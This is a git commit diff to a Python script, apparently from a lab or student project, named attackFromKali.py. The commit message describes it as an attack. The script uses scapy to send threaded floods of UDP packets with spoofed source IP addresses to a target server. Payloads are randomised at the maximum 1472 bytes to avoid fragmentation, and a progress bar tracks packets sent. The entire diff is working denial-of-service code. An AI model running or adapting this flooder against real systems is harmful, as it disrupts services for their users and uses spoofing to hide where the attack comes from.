c41af402a47420565478768dc2222eacfd74e1a1
Jason Salem <44297233+jasonsalem2002@users.noreply.github.com>
2023-10-01 00:45:19 +0300

    Added maximum payload size, progress bar and fixed bugs
    Attacker now send packets of payload of maximum size (1472 bytes) for the UDP packets to avoid IP fragmentation.
    
    Added a progress bar to track the progress of the attack, the number of packets being sent and already sent.
    
    Fix some threading issues

--- attackFromKali.py
+++ attackFromKali.py
@@ -1,61 +1,53 @@
 from scapy.all import *
-from scapy.layers.inet import UDP, IP
 import random
 import threading
 import time
+from tqdm import tqdm
 
-source_ips=[]
-for w in range(255):
-    for k in range(255):
-        for l in range(255):
-            ip_address = f"192.168.{k}.{l}"
-            ip_address1 = f"10.{w}.{k}.{l}"
-            if (w>=16) & (w<=31):
-                ip_address2 = f"172.{w}.{k}.{l}"
-                source_ips.append(ip_address2)
-            source_ips.append(ip_address)
-            source_ips.append(ip_address1)
+sent_packets = 0
+start_time = 0
 
-# Function representing the task to be performed in each thread
-def send_udp_packet(server_ip, server_port, source_ips, message):
-    # Choose a random source IP address
-    source_ip = random.choice(source_ips)
+sent_packets_lock = threading.Lock()
 
-    # Create a UDP packet with a randomized source IP, and without coinciding with server_ip
-    if (source_ip != server_ip): 
-        udp_packet = IP(src=source_ip, dst=server_ip) / UDP(dport=server_port) / message
+def send_udp_packet(server_ip, server_port, source_ips, count, progress_bar):
+    global sent_packets, start_time
+    while sent_packets < count:
+        source_ip = random.choice(source_ips)
 
-    # Send the packet
-    send(udp_packet)
+        udp_packet = IP(src=source_ip, dst=server_ip) / UDP(dport=server_port) / Raw(RandString(size=1472))
+
+        send(udp_packet, verbose=0)
+
+        with sent_packets_lock:
+            sent_packets += 1
+
+        progress_bar.update(1)
+        progress_bar.set_postfix(PacketsSent=sent_packets)
+
+        time.sleep(1)  
 
 # Main function
 def main():
-    message = input("Enter the message to send: ")
-    iterations = int(input("Enter the number of times to execute the attack: "))
-    
-    # Server IP and port (replace with actual values)
-    server_ip = '192.168.180.128'
+    global start_time
+    number_of_packets = int(input("Enter the number of times to execute the attack: "))
+
+    server_ip = '192.168.119.130'
     server_port = 12345
 
+    source_ips = ['192.168.1.100', '192.168.1.101', '192.168.1.102']
 
-    threads = []
+    start_time = time.time()  
+    
+    with tqdm(total=number_of_packets, desc="Sending Packets", unit="pkt") as progress_bar:
+        threads = []
 
-    start_time = time.time()  # Record the start time
+        for _ in range(number_of_packets):
+            thread = threading.Thread(target=send_udp_packet, args=(server_ip, server_port, source_ips, number_of_packets, progress_bar))
+            threads.append(thread)
+            thread.start()
 
-    # Create threads and start the attack
-    for _ in range(iterations):
-        thread = threading.Thread(target=send_udp_packet, args=(server_ip, server_port, source_ips, message))
-        threads.append(thread)
-        thread.start()
-
-    # Wait for all threads to complete
-    for thread in threads:
-        thread.join()
-
-    end_time = time.time()  # Record the end time
-
-    duration = end_time - start_time
-    print(f"Executed the attack for {iterations} time(s) in {duration:.2f} seconds.")
+        for thread in threads:
+            thread.join()
 
 if __name__ == "__main__":
     main()
